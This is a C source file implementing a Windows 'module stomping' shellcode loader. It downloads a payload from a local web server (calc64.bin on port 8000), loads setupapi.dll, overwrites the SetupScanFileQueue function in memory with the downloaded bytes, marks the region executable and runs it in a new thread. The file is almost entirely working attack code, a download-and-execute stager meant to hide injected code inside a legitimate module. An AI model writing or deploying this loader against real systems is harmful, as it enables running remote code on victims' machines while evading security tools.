#include <stdio.h>
#include <Windows.h>


#define		SACRIFICIAL_DLL			"setupapi.dll"
#define		SACRIFICIAL_FUNC		"SetupScanFileQueue"

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    DWORD	dwOldProtection = NULL;

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

void moduleStomper() {
    unsigned char* payload = NULL;
    DWORD size = 0;  // Changed to DWORD to match the fetchCode function

    int result = fetchCode(L"localhost", L"/calc64.bin", 8000, &payload, &size);
    if (result != 0) {
        printf("[-] Failed to fetch shellcode with error code %d\n", result);
        return;  // Changed to return; as the function is void
    }

    printf("[+] Received shellcode...\n");
    for (int i = 0; i < size; ++i) {
        printf("%02x ", payload[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");

    PVOID		pAddress = NULL;
    HMODULE		hModule = NULL;
    HANDLE		hThread = NULL;

    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
        return;
    }

    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return;
    }

    if (!WritePayload(pAddress, payload, size)) {  // Used size instead of sizeof(payload)
        return;
    }

    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    // Free the payload when you're done
    free(payload);
}
